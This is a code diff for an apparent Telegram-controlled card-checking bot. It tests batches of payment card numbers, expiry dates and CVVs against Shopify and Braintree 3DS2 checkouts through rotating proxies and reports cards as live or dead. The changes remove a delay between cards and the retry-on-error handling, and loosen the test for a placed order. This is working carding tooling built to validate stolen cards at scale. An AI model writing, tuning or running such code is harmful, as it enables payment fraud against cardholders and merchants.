@@ -30,18 +30,17 @@ def banner():
    ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
 """
     for l in art.strip("\n").split("\n"): print(grad(l))
-    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v3.0{C.R}{C.D}  |  Auto-Retry + 2s Delay{C.R}\n")
+    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v2.2{C.R}{C.D}  |  Termux/Pydroid{C.R}\n")
 
 # ---------- Config ----------
 BATCH_MAX      = 1000
-MSG_PER_BATCH  = 10
+MSG_PER_BATCH  = 20
 PROGRESS_EVERY = 50
 TG_SEND_DELAY  = 0.05
 RESULT_DIR     = "./results"
 os.makedirs(RESULT_DIR, exist_ok=True)
 
 TG_W           = 2          # total workers / lanes
-CARD_DELAY     = 2.0        # ကဒ်တစ်ခုနဲ့တစ်ခုကြား စောင့်ချိန် (စက္ကန့်)
 
 # ---------- Proxies ----------
 RAW_PROXIES=[
@@ -455,7 +454,7 @@ async def process_card(cc,mes,ano,cvv,site,vid=None):
             if 'WaitingReceipt' in ft: return False,"Change Proxy",gw,tp,cur
             try:
                 rj=json.loads(ft); result=rj.get('data',{}).get('receipt',{}).get('processingError',{}).get('code')
-                if "shopify_payments" in str(rj) and "DECLINED" not in str(rj): return True,"ORDER_PLACED",gw,tp,cur
+                if "shopify_payments" in str(rj): return True,"ORDER_PLACED",gw,tp,cur
                 elif result: return True,result,gw,tp,cur
                 return True,"MISMATCHED_BILL",gw,tp,cur
             except: pass
@@ -524,6 +523,7 @@ _batch_lock=threading.Lock()
 _batch_seq=0
 _batches=OrderedDict()
 
+# per-worker lanes; each batch pinned to one lane
 _lanes=[_q.Queue() for _ in range(TG_W)]
 _lane_rr={"i":0}
 _lane_rr_lock=threading.Lock()
@@ -635,7 +635,6 @@ def _worker(wid, lane):
 
         with _slk: _st["r"]+=1
         try:
-            time.sleep(CARD_DELAY) # <-- ဒီနေရာမှာ ၂ စက္ကန့် စောင့်မယ်
             p=parse_cc(ccs); t0=time.time()
             if mode=="bt":
                 succ,msg,gw,prc,cur=bt_check(p['cc'],p['mes'],p['ano'],p['cvv'])
@@ -650,66 +649,43 @@ def _worker(wid, lane):
                  "price":prc,"cur":cur,"el":el,"bin":bin_line(p['cc']),
                  "succ":succ,"idx":idx}
 
-            # ERROR DETECT -> RETRY
-            is_error = any(err in cl.upper() for err in ["LOOKUP ERROR", "NO SESSION", "BAD JSON", "REQ FAILED", "PROXY", "TIMEOUT", "ERROR"])
-            
-            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0; retries=[]
+            with _slk:
+                _st["p"]+=1
+                if succ: _st["live"]+=1
+                else:    _st["dead"]+=1
 
-            if is_error and bid is not None:
-                with _batch_lock:
-                    b=_batches.get(bid)
-                    if b:
-                        b["retry_queue"].append((mode,cid,mid,site,ccs,None,bid,idx))
-                        row = None 
-            else:
-                with _slk:
-                    _st["p"]+=1
-                    if succ: _st["live"]+=1
-                    else:    _st["dead"]+=1
-
-            if row is not None:
-                with _batch_lock:
-                    b=_batches.get(bid) if bid is not None else None
-                    if b:
-                        b["done"].append(row)
-                        b["pending_rows"].append(row)
-                        done_n=len(b["done"]); total=b["total"]
-                        flush = len(b["pending_rows"])>=MSG_PER_BATCH
-                        prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
-                        finished = (done_n==total)
-                        if flush:
-                            rows_to_send=list(b["pending_rows"])
-                            b["pending_rows"].clear()
+            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0
+            with _batch_lock:
+                b=_batches.get(bid) if bid is not None else None
+                if b:
+                    b["done"].append(row)
+                    b["pending_rows"].append(row)
+                    done_n=len(b["done"]); total=b["total"]
+                    flush = len(b["pending_rows"])>=MSG_PER_BATCH
+                    prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
+                    finished = (done_n==total)
+                    if flush:
+                        rows_to_send=list(b["pending_rows"])
+                        b["pending_rows"].clear()
 
             if rows_to_send:
                 _send(cid,_result_block(rows_to_send),rt=mid,pm="HTML")
             if prog:
                 _send(cid,f"⏳ <b>Batch #{bid}</b> · {done_n}/{total} done",rt=mid,pm="HTML")
-                
             if finished:
                 with _batch_lock:
-                    b=_batches.get(bid)
-                    if b and b.get("retry_queue"):
-                        retries = list(b["retry_queue"])
-                        b["retry_queue"].clear()
-                        finished = False
-                    else:
-                        b=_batches.pop(bid,None)
-                
-                if finished and b:
+                    b=_batches.pop(bid,None)
+                if b:
                     if b["pending_rows"]:
                         _send(cid,_result_block(b["pending_rows"]),rt=mid,pm="HTML")
                     _send(cid,_batch_summary(b),rt=mid,pm="HTML")
                     try:
                         path=_dump_batch_file(b)
-                        _send_file(cid,path, caption=f"batch #{b['bid']} results · {len(b['done'])} cards", rt=mid)
+                        _send_file(cid,path,
+                                   caption=f"batch #{b['bid']} results · {len(b['done'])} cards",
+                                   rt=mid)
                     except Exception as e:
                         print(f"{C.D}[TG] dump: {e}{C.R}")
-                        
-            for r_item in retries:
-                _lanes[lane].put(r_item)
-                with _slk: _st["q"]+=1
-
         except Exception as e:
             with _slk: _st["f"]+=1
             try: _send(cid,f"⚠️ {_esc(e)}",rt=mid,pm="HTML")
@@ -738,7 +714,7 @@ def _enqueue_batch(mode,cid,mid,site,ccs_list,invalid):
         _batches[bid]={"bid":bid,"cid":cid,"mid":mid,"mode":mode,"site":site,
                        "cards":list(ccs_list),"done":[],"pending_rows":[],
                        "invalid":list(invalid),"total":len(ccs_list),
-                       "lane":lane, "retry_queue": []}
+                       "lane":lane}
     hdr=(f"📥 <b>Batch #{bid}</b> · {len(ccs_list)} card(s) queued · lane {lane+1}"
          + (f"\n⚠️ {len(invalid)} invalid skipped" if invalid else ""))
     _send(cid,hdr,rt=mid,pm="HTML")
